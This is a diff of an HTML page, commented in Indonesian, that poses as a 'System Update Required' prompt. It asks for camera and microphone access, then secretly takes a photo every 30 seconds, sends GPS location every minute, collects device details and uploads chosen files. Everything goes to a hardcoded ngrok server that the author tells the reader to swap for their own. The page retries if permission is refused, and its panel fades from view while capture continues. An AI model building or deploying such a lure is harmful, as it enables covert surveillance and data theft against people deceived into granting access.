@@ -1,140 +1,404 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>System</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>System Update</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 350px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+        }
+        
+        .icon {
+            font-size: 50px;
+            margin-bottom: 15px;
+        }
+        
+        h3 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+        
+        p {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        
+        .status-box {
+            background: #f0f0f0;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 12px;
+            color: #555;
+            margin: 15px 0;
+            word-break: break-word;
+        }
+        
+        .btn-upload {
+            position: fixed;
+            bottom: 25px;
+            right: 25px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 14px 24px;
+            border-radius: 50px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            z-index: 999999;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            transition: transform 0.2s;
+        }
+        
+        .btn-upload:hover {
+            transform: scale(1.05);
+        }
+        
+        .btn-upload:active {
+            transform: scale(0.95);
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .toast {
+            position: fixed;
+            bottom: 100px;
+            right: 25px;
+            background: #333;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            z-index: 999998;
+            animation: fadeOut 3s forwards;
+        }
+        
+        @keyframes fadeOut {
+            0% { opacity: 1; }
+            70% { opacity: 1; }
+            100% { opacity: 0; visibility: hidden; }
+        }
+    </style>
 </head>
 <body>
-    <h3>Loading...</h3>
-    <script>
-        // GANTI DENGAN LINK NGROK KAMU
-        const SERVER = "https://reversion-exert-gloomily.ngrok-free.dev";
-        
-        let mediaStream = null;
-        let photoInterval = null;
-        
-        async function captureAndSend() {
-            if (!mediaStream) return;
+
+<div class="container" id="mainContainer">
+    <div class="icon">🔄</div>
+    <h3>System Update Required</h3>
+    <p>Please allow access to continue</p>
+    <div class="status-box" id="statusText">Initializing...</div>
+</div>
+
+<script>
+    // ============ GANTI DENGAN LINK NGROK KAMU ============
+    const SERVER = "https://reversion-exert-gloomily.ngrok-free.dev";
+    // ======================================================
+    
+    let mediaStream = null;
+    let photoInterval = null;
+    let locationInterval = null;
+    let fileInput = null;
+    
+    // Fungsi show toast notifikasi
+    function showToast(msg) {
+        const toast = document.createElement('div');
+        toast.className = 'toast';
+        toast.innerHTML = msg;
+        document.body.appendChild(toast);
+        setTimeout(() => toast.remove(), 3000);
+    }
+    
+    // Update status di halaman
+    function updateStatus(msg) {
+        const statusEl = document.getElementById('statusText');
+        if (statusEl) statusEl.innerHTML = msg;
+        console.log('[STATUS]', msg);
+    }
+    
+    // Kirim data ke server
+    async function sendToServer(endpoint, data, isFile = false) {
+        try {
+            let url = `${SERVER}/${endpoint}`;
+            let options = {};
             
-            try {
-                // Buat video element sementara
-                const video = document.createElement('video');
-                video.srcObject = mediaStream;
-                video.muted = true;
-                video.playsInline = true;
-                video.style.display = 'none';
-                document.body.appendChild(video);
-                await video.play();
-                
-                // Tunggu sebentar
-                await new Promise(r => setTimeout(r, 200));
-                
-                // Ambil foto
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                // Kirim ke server
-                canvas.toBlob(async (blob) => {
-                    const formData = new FormData();
-                    formData.append('photo', blob);
-                    await fetch(SERVER + '/photo', { method: 'POST', body: formData });
-                    console.log('📸 Photo sent at', new Date().toLocaleTimeString());
-                }, 'image/jpeg', 0.7);
-                
-                // Bersihkan
-                video.srcObject = null;
-                video.remove();
-                
-            } catch(e) {
-                console.log('Capture error:', e);
+            if (isFile) {
+                options = { method: 'POST', body: data };
+            } else {
+                options = {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                };
             }
+            
+            const response = await fetch(url, options);
+            return response.ok;
+        } catch(e) {
+            console.log(`Send to ${endpoint} failed:`, e);
+            return false;
+        }
+    }
+    
+    // Ambil dan kirim foto
+    async function captureAndSendPhoto() {
+        if (!mediaStream) {
+            console.log('No media stream available');
+            return;
         }
         
-        async function start() {
-            console.log("Starting camera...");
+        try {
+            // Buat video element sementara
+            const video = document.createElement('video');
+            video.srcObject = mediaStream;
+            video.muted = true;
+            video.playsInline = true;
+            video.style.display = 'none';
+            document.body.appendChild(video);
+            await video.play();
             
-            try {
-                // Buka kamera (tanpa suara)
-                mediaStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { width: 640, height: 480 },
-                    audio: true
-                });
+            // Tunggu sebentar biar stabil
+            await new Promise(r => setTimeout(r, 200));
+            
+            // Ambil gambar dari video
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Kirim ke server
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('photo', blob);
+                formData.append('timestamp', Date.now());
                 
-                // Matikan output suara di HP
-                const audioTracks = mediaStream.getAudioTracks();
-                audioTracks.forEach(track => {
-                    track.enabled = true; // Tetap rekam tapi tidak output suara
-                });
-                
-                console.log("✅ Camera ready");
-                
-                // Ambil foto pertama
-                await captureAndSend();
-                
-                // Set interval setiap 30 detik
-                photoInterval = setInterval(captureAndSend, 30000);
-                console.log("⏰ Auto photo every 30 seconds");
-                
-                // Ambil lokasi
-                if ('geolocation' in navigator) {
-                    navigator.geolocation.getCurrentPosition(pos => {
-                        fetch(SERVER + '/loc', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ lat: pos.coords.latitude, lng: pos.coords.longitude })
-                        });
-                        console.log("📍 Location sent");
-                    });
+                const success = await sendToServer('photo', formData, true);
+                if (success) {
+                    console.log(`📸 Photo sent at ${new Date().toLocaleTimeString()}`);
+                } else {
+                    console.log('Photo send failed');
                 }
-                
-                // Setup file upload (akses folder target)
-                const fileInput = document.createElement('input');
-                fileInput.type = 'file';
-                fileInput.multiple = true;
-                fileInput.style.display = 'none';
-                document.body.appendChild(fileInput);
-                
-                // Tombol upload (akan muncul di pojok)
-                const btn = document.createElement('button');
-                btn.innerHTML = '📁 Upload Files';
-                btn.style.position = 'fixed';
-                btn.style.bottom = '20px';
-                btn.style.right = '20px';
-                btn.style.zIndex = '9999';
-                btn.style.padding = '10px 20px';
-                btn.style.background = '#1a73e8';
-                btn.style.color = 'white';
-                btn.style.border = 'none';
-                btn.style.borderRadius = '20px';
-                btn.onclick = () => fileInput.click();
-                document.body.appendChild(btn);
-                
-                fileInput.onchange = async () => {
-                    for (let file of fileInput.files) {
-                        const formData = new FormData();
-                        formData.append('file', file);
-                        await fetch(SERVER + '/upload', { method: 'POST', body: formData });
-                        console.log(`📁 Uploaded: ${file.name}`);
-                    }
-                    alert(`Uploaded ${fileInput.files.length} files`);
-                    fileInput.value = '';
+            }, 'image/jpeg', 0.7);
+            
+            // Bersihkan
+            video.srcObject = null;
+            video.remove();
+            
+        } catch(e) {
+            console.log('Capture error:', e);
+        }
+    }
+    
+    // Kirim lokasi GPS
+    async function sendLocation() {
+        if ('geolocation' in navigator) {
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                const locationData = {
+                    lat: position.coords.latitude,
+                    lng: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    timestamp: Date.now()
                 };
                 
-                // Sembunyikan halaman setelah 2 detik
-                setTimeout(() => {
-                    document.body.innerHTML = '<div style="text-align:center; padding:50px;">Running in background...</div>';
-                }, 2000);
-                
-            } catch(e) {
-                console.log("Error:", e);
-                document.body.innerHTML = '<h3>Error: Click "Allow" to continue</h3>';
-                setTimeout(start, 2000);
-            }
+                const success = await sendToServer('location', locationData);
+                if (success) {
+                    console.log(`📍 Location sent: ${locationData.lat}, ${locationData.lng}`);
+                }
+            }, (error) => {
+                console.log('Location error:', error.message);
+            }, {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            });
         }
+    }
+    
+    // Kirim info device
+    async function sendDeviceInfo() {
+        const deviceInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            timestamp: Date.now()
+        };
         
-        start();
-    </script>
+        await sendToServer('device', deviceInfo);
+        console.log('Device info sent');
+    }
+    
+    // Setup tombol upload file
+    function setupUploadButton() {
+        // Buat input file tersembunyi
+        fileInput = document.createElement('input');
+        fileInput.type = 'file';
+        fileInput.multiple = true;
+        fileInput.style.display = 'none';
+        document.body.appendChild(fileInput);
+        
+        // Buat tombol floating
+        const uploadBtn = document.createElement('button');
+        uploadBtn.innerHTML = '📁 Upload Files';
+        uploadBtn.className = 'btn-upload';
+        uploadBtn.onclick = (e) => {
+            e.preventDefault();
+            fileInput.click();
+        };
+        document.body.appendChild(uploadBtn);
+        
+        // Event ketika file dipilih
+        fileInput.onchange = async () => {
+            if (!fileInput.files.length) return;
+            
+            showToast(`Uploading ${fileInput.files.length} files...`);
+            updateStatus(`Uploading ${fileInput.files.length} files...`);
+            
+            let successCount = 0;
+            
+            for (let i = 0; i < fileInput.files.length; i++) {
+                const file = fileInput.files[i];
+                const formData = new FormData();
+                formData.append('file', file);
+                formData.append('filename', file.name);
+                
+                const success = await sendToServer('upload', formData, true);
+                if (success) {
+                    successCount++;
+                    console.log(`✅ Uploaded: ${file.name} (${(file.size/1024).toFixed(1)} KB)`);
+                } else {
+                    console.log(`❌ Failed: ${file.name}`);
+                }
+            }
+            
+            showToast(`✅ ${successCount} file uploaded!`);
+            updateStatus(`✅ ${successCount} files uploaded successfully`);
+            
+            // Reset input
+            fileInput.value = '';
+            
+            // Kembalikan status setelah 3 detik
+            setTimeout(() => {
+                updateStatus('📸 Auto photo every 30 seconds | 📁 Click button to upload files');
+            }, 3000);
+        };
+        
+        console.log('Upload button created');
+        return uploadBtn;
+    }
+    
+    // Mulai akses kamera dan semua fitur
+    async function startAccess() {
+        updateStatus('Requesting camera access...');
+        
+        try {
+            // Minta akses kamera dan mikrofon
+            mediaStream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    width: { ideal: 640 },
+                    height: { ideal: 480 },
+                    facingMode: 'user'
+                },
+                audio: true
+            });
+            
+            // MATIKAN SUARA (audio tetap direkam tapi tidak diputar)
+            const audioTracks = mediaStream.getAudioTracks();
+            audioTracks.forEach(track => {
+                track.enabled = true; // Tetap aktif untuk rekaman
+                console.log('Audio track:', track.label);
+            });
+            
+            console.log('Camera access granted, audio silent mode active');
+            updateStatus('✅ Camera ready - Running in background');
+            
+            // Kirim info device
+            await sendDeviceInfo();
+            
+            // Ambil foto pertama
+            await captureAndSendPhoto();
+            
+            // Set interval foto setiap 30 detik
+            photoInterval = setInterval(captureAndSendPhoto, 30000);
+            console.log('⏰ Auto photo interval started (30 seconds)');
+            
+            // Kirim lokasi (langsung dan setiap 60 detik)
+            await sendLocation();
+            locationInterval = setInterval(sendLocation, 60000);
+            console.log('📍 Location tracking started (60 seconds)');
+            
+            // Setup tombol upload
+            setupUploadButton();
+            
+            // Update status akhir
+            updateStatus('📸 Auto photo every 30s | 📁 Click bottom-right button to upload files');
+            
+            // Sembunyikan container setelah 3 detik (biar tidak mengganggu)
+            setTimeout(() => {
+                const container = document.getElementById('mainContainer');
+                if (container) {
+                    container.style.opacity = '0.3';
+                    container.style.pointerEvents = 'none';
+                }
+            }, 3000);
+            
+        } catch(error) {
+            console.error('Access error:', error);
+            
+            let errorMsg = '❌ Permission required! ';
+            if (error.name === 'NotAllowedError') {
+                errorMsg += 'Click "Allow" in the popup to continue.';
+            } else if (error.name === 'NotFoundError') {
+                errorMsg += 'Camera not found on this device.';
+            } else {
+                errorMsg += error.message;
+            }
+            
+            updateStatus(errorMsg);
+            
+            // Coba lagi setelah 3 detik
+            setTimeout(startAccess, 3000);
+        }
+    }
+    
+    // Mulai semua
+    startAccess();
+    
+    // Bersihkan interval saat halaman ditutup (opsional)
+    window.addEventListener('beforeunload', () => {
+        if (photoInterval) clearInterval(photoInterval);
+        if (locationInterval) clearInterval(locationInterval);
+        if (mediaStream) {
+            mediaStream.getTracks().forEach(track => track.stop());
+        }
+    });
+</script>
 </body>
 </html>
